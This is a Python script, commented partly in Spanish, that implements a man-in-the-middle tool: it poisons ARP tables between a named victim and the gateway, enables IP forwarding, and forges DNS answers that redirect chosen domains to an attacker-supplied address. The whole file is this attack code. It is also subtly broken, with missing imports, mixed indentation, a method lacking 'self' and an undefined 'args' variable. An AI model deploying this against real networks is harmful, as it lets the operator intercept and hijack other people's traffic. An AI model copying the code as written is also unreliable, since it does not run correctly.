from scapy.all import *
import subprocess
import sys

class ARPPoisoning(threading.Thread):
	def __init__(self, srcAddress, dstAddress):
		'''
			Receive the source and destination address for the ARP packet.
		'''
		threading.Thread.__init__(self)
		self.srcAddress = srcAddress
		self.dstAddress = dstAddress

	def run(self):
		'''
			Every thread sends an ARP packet to the destination every second.
		'''
		try:
			arpPacket = ARP(pdst=self.dstAddress, psrc=self.srcAddress)# crea un paquete ARP
			send(arpPacket, verbose=False, loop=1)
			#enviar un paquete ARP de forma indefinida cada segundo, esto DOS a la victima

		except:
			print ("Unexpected error:", sys.exc_info()[0])

class DNSSpoofing():
	'''
		This class will start the DNS Spoofing attack.
	'''

	def __init__(self, interface, capFilter, addressToRedirect):
		'''
			Setup the values for the attack.
		'''
		self.interface = interface
		self.filter = capFilter
		self.addressToRedirect = addressToRedirect


	def startAttack(self, domains, verbose):
		'''
			Start the attack with the domains specified by command-line
		'''
		self.verbose = verbose
		fd = open(domains)
		self.target = {}
		for line in fd.readlines():
			self.target[line.split(':')[0]] = (line.split(':')[1]).replace('\n')
		try:
			cleanRules()
			self.enableForwarding()
			self.redirectionRules()
			sniff(iface=self.interface, filter=self.filter, prn=self.ShowOrPoisoning)
		except KeyboardInterrupt:
			raise
		except:
			self.disableForwarding()
			self.cleanRules()

    def ShowOrPoisoning(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) > 0: #preguntar si el paquete tiene la capa DNS  y el atributo qr = 0
    		for targetDomain, ipAddressTarget in self.target.items():
    			if packet.getlayer(DNS).qd.qname == targetDomain:
    				try:
                        #Extraer las capas del paquete capturado
    					requestIP = packet[IP]
    					requestUDP = packet[UDP]
    					requestDNS = packet[DNS]
    					requestDNSQR = packet[DNSQR]   #Esta corresponde a la peticion DNS

                        #Componer cada una de las capas del paquete de respuesta
    					responseIP = IP(src=requestIP.dst, dst=requestIP.src)
    					responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
    					responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
    					responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
    					answer = responseIP/responseUDP/responseDNS
    					send(answer)
    				except:
    					print ("Unexpected error:", sys.exc_info()[0])
    					print ("Exception...")
    	else:
            print (packet.summary())


def main():
	parser = argparse.ArgumentParser(description="ARP-MITM and DNS-Spoofing Tool")
	parser.add_argument("-t", "--target", required=True,  help="Victim IP Address")
	parser.add_argument("-g", "--gateway", required=True, default="192.168.1.1", help="Gateway IP Address")
	parser.add_argument("-r", "--route", required=True, help="Redirect all HTTP/HTTPS trafic to the specified Ip Address.")
	parser.add_argument("-d", "--domains", required=True, help="File to perform DNS Spoofing.")

	parser.add_argument("-v", "--verbose", required=False, default=False, help="Verbose")
	parser.add_argument("-i", "--interface", required=False, default="wlan0", help="IFace to use.")
	parser.add_argument("-f", "--filter", required=False, default="udp port 53", help="Capture Filter.")


    arguments = parser.parse_args()

	subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward")

    gatewayIP = arguments.gateway
    victimIP = arguments.target

    victim = ARPPoisoning(gatewayIP, victimIP)
    gateway = ARPPoisoning(victimIP, gatewayIP)
    victim.setDaemon(True)
    gateway.setDaemon(True)

    victim.start()  #arrancar ambos hilos para envenenar las tablas ARP en ambos sentidos
    gateway.start()

    #sniff(iface=arguments.interface,filter="udp port 53", prn= )
    #prn ejecuta la funcion cada vez que se captura un paquete
    #udp port 53 son es por defecto donde corren todas las peticiones DNS
    #capturar los paquetes de la interfaces de red que indicamos
    dnsSpoof = DNSSpoofing(args.interface, args.filter, args.route)
	dnsSpoof.startAttack(args.domains, args.verbose)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward")
